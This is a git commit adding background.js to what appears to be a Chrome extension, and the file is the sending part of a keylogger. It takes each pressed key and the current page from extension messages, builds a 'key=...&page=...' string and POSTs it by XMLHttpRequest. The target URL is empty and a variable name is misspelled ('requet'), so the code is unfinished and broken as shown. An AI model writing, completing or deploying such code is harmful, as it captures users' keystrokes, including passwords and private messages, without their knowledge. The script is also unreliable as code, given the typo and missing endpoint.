10b2da553186cc6f72f425a23523c9f008c92c72
Rjibaraoko <junior4553@hotmail.fr>
2023-12-05 19:20:36 +0100

    Mostly done

---
+++ background.js
@@ -0,0 +1,23 @@
+function handleMessage(request){
+    //alerts that give us direct output of the key pressed and which page we are currently on
+    //alert(request.key);
+    //alert(request.page);
+
+    data = "key="+request.key+"&page="+requet.page;
+
+    //key=g&page=google.com <-- query srting
+
+    var xhr = new XMLHttpRequest();
+    xhr.onload = function() {
+        alert(this.responseText);
+    }
+
+    xhr.open("POST","",true);
+    xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+    xhr.send(data);
+}
+
+
+
+
+chrome.runtime.onMessage.addListener(handleMessage);
